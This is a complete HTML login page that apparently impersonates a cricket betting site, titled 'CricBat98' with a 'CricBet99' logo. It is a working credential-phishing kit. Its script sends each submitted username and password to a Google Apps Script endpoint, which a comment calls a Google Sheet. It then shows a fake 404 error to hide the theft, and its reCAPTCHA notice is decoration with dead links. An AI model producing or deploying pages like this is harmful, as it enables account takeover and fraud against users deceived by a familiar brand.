<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CricBat98</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(5deg, rgba(69, 100, 51, 0.959),#355539,#2e4731,#864f04);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        .logo {
            width: 320px;
            height: auto;
            margin-bottom: 20px;
            position: relative;
            top: -350px;
        }

        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 280px;
            text-align: center;
            margin-top: -350px;
        }

        .login-heading {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 10px;
            color: #8B4513;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .form-group input {
            width: calc(100% - 20px);
            padding: 10px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            font-size: 14px;
        }

        .form-group input:focus {
            outline: none;
            border-color: #007bff;
        }

        .btn {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #8B4513;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
        }

        .btn:hover {
            background-color: #5A3310;
        }

        .recaptcha-text {
            font-size: 12px;
            color: #6c757d;
            text-align: center;
            margin-top: 15px;
        }

        .recaptcha-text a {
            color: #007bff;
            text-decoration: none;
        }

        .recaptcha-text a:hover {
            text-decoration: underline;
        }

        .error-page {
            display: none;
            text-align: center;
            font-size: 48px;
            font-weight: bold;
            color: white;
            background-color: black;
            width: 300px;
            padding: 40px;
            border-radius: 10px;
            margin-top: 20px;
            position: relative;
            top: -50px;
        }

        .error-page button {
            background-color: #8B4513;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
        }

        .error-page button:hover {
            background-color: #5A3310;
        }

        .hide-logo {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Logo -->
    <img src="logo.png" alt="CricBet99 Logo" class="logo" id="logo">

    <!-- Login Form Container -->
    <div class="login-container">
        <div class="login-heading">LOGIN</div>
        <form action="https://script.google.com/macros/s/AKfycbz2yNi0v9CH5eN9OwTyEjnVMsmn1x7dOaG-BgdmekNg8cMPuf6fzymh4r9fKAKybJ-s/exec" method="POST" id="loginForm" onsubmit="handleLoginForm(event)">
            <div class="form-group">
                <label for="UserName"></label>
                <input type="text" id="UserName" name="UserName" placeholder="User Name" required>
            </div>
            <div class="form-group">
                <label for="password"></label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="btn">Login</button>
        </form>

        <div class="recaptcha-text">
            <span>This site is protected by reCAPTCHA and the Google</span> 
            <a href="#">Privacy Policy</a> and 
            <a href="#">Terms of Service</a> apply.
        </div>
    </div>

    <!-- Error Page -->
    <div class="error-page" id="errorPage">
        404 PAGE NOT FOUND
        <button onclick="goBackToHome()">Back to Home Page</button>
    </div>

    <script>
        // Handle the login form submission
        function handleLoginForm(event) {
            event.preventDefault(); // Prevent the default form submission

            // Retrieve form data
            const form = event.target;
            const formData = new FormData(form);

            // Submit the form data to the Google Sheet
            fetch(form.action, {
                method: 'POST',
                body: formData,
            })
            .then(() => {
                // After submission, show the 404 error page
                document.querySelector('.login-container').style.display = 'none'; // Hide the login container
                document.getElementById('errorPage').style.display = 'block'; // Show the error page
                document.getElementById('logo').classList.add('hide-logo'); // Hide the logo
            })
            .catch((error) => {
                console.error('Error submitting the form:', error); // Log any errors
            });
        }

        // Function to redirect back to the home page
        function goBackToHome() {
            window.location.href = 'index.html'; // Adjust URL if needed
        }
    </script>
</body>
</html>
